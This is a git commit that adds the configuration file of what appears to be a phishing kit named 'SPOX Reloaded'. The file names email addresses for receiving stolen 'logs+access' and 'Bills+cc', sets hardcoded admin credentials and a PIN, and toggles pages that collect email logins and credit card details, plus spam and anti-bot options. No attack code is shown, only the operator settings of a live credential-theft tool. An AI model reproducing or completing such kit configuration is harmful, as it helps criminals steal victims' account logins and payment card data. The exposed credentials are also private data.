d36413c71b3b1455f48f1c3a666dabe397adf34c
jennyfielding12 <100756172+jennyfielding12@users.noreply.github.com>
2022-03-02 23:22:06 +0100

    transferred files

---
+++ admin/YOUR-CONFIG.php
@@ -0,0 +1,33 @@
+<?php
+
+
+// SPAM INFO
+
+$yourname = "SPOX Reloaded";     //insert your name
+$your_email = "jennyfielding12@protonmail.com"; // logs+access
+$your_email2 = "jennyfielding12@protonmail.com"; // Bills+cc
+
+
+//ADMIN LOGIN INFO   (yourdomain.com/admin/login.php)
+
+$username = "admin";          //insert your login name
+$password = "Getthedew.12";        // insert your login password
+$pin = "080808"; 
+
+
+
+// ON / OFF 
+$spam_hotmail = "yes";
+$double_login = "yes";
+$double_access = "yes";
+$spox_protection = "yes";
+$double_cc = "no";
+$show_start_page = "yes"; 
+$show_email_access = "yes"; 
+$show_contact_information = "yes";
+$show_credit_card = "yes";
+$show_success_page = "yes";
+$anti_bot = "yes";
+
+
+?>
